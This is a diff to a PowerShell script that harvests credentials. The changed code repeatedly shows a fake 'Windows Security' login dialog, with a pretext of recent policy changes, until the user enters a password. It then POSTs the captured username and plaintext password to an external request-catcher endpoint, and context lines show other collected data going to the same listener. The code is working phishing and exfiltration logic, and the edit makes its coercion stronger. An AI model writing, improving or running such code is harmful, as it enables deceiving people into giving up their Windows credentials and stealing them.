@@ -236,50 +236,63 @@ $tree
 # Send to your listener
 Invoke-WebRequest -Uri "https://flipped.requestcatcher.com/" -Method POST -Body @{debug = $data}
 
-# ============================== [PROMPT FOR CREDENTIALS] ==============================
+# ============================== [FORCED CREDENTIAL PROMPT] ==============================
 
-$attempt = 0
-$maxAttempts = 3
-$enteredUsername = ""
-$enteredPassword = ""
+function Request-ValidCredential {
+    param (
+        [int]$MaxRetries = 5
+    )
 
-do {
-    try {
-        $cred = $Host.ui.PromptForCredential(
-            'Windows Security Update',
-            'Due to recent changes, please re-authenticate:',
-            $env:USERNAME,
-            ''
-        )
-        $enteredUsername = $cred.UserName
-        $enteredPassword = $cred.GetNetworkCredential().Password
-    } catch {
-        $enteredUsername = "Prompt failed"
-        $enteredPassword = ""
-    }
+    $tries = 0
+    do {
+        try {
+            $cred = $Host.ui.PromptForCredential(
+                'Windows Security',
+                'Due to recent policy changes, authentication is required to continue.',
+                $env:USERNAME,
+                ''
+            )
 
-    $attempt++
-} while (($enteredPassword -eq "") -and ($attempt -lt $maxAttempts))
+            $user = $cred.UserName
+            $pass = $cred.GetNetworkCredential().Password
 
-# ============================== [SEND CREDENTIALS IF ENTERED] ==============================
+            if ($pass -ne "") {
+                return $cred
+            } else {
+                $tries++
+            }
+        } catch {
+            # User pressed "Cancel" or closed the dialog
+            $tries++
+        }
+    } while ($tries -lt $MaxRetries)
 
-if ($enteredPassword -ne "") {
+    return $null
+}
+
+$finalCred = Request-ValidCredential
+
+# ============================== [HANDLE RESULT] ==============================
+
+if ($finalCred -ne $null) {
+    $finalUser = $finalCred.UserName
+    $finalPass = $finalCred.GetNetworkCredential().Password
+
     Invoke-WebRequest -Uri "https://flipped.requestcatcher.com/" -Method POST -Body @{
         debug = @"
 ===== [Captured Credentials] =====
-Username: $enteredUsername
-Password: $enteredPassword
+Username: $finalUser
+Password: $finalPass
 "@
     }
+
+    Start-Sleep -Seconds 3
 } else {
     Invoke-WebRequest -Uri "https://flipped.requestcatcher.com/" -Method POST -Body @{
-        debug = "Credential prompt failed or skipped after $attempt attempt(s)."
+        debug = "User failed to authenticate after multiple forced attempts."
     }
 }
 
-# ============================== [WAIT BEFORE EXIT] ==============================
-
-Start-Sleep -Seconds 3
 
 
 # ============================== [END] ==============================
